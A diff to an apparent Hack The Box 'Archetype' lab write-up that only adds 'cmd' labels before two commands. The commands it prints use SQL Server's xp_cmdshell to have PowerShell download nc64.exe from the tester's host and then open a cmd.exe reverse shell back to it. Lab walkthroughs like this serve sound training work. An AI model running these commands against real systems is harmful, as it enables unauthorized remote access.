@@ -102,10 +102,10 @@ only user Administrator can perform actions with higher privileges.<br>
 We need to change the current working directory somewhere in the home directory of our user where it will be possible to write.<br><br>
 After a quick enumeration we found that Downloads is working perfectly for us to place our binary.<br>
 In order to do that, we are going to use the wget tool within PowerShell:<br>
-<code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://&lt;target_ip&gt;/nc64.exe -outfile nc64.exe"</code><br>
+<b>cmd</b>：<code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://&lt;target_ip&gt;/nc64.exe -outfile nc64.exe"</code><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/httpserver.png" alt="httpserver" width="60%">
 
-<code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe &lt;target_ip&gt;</code><br>
+<b>cmd</b>：<code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe &lt;target_ip&gt;</code><br>
 Finally looking back at our netcat listener we can confirm our reverse shell and our foothold to the system:<br>
 
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/nc.png" alt="nc" width="60%">
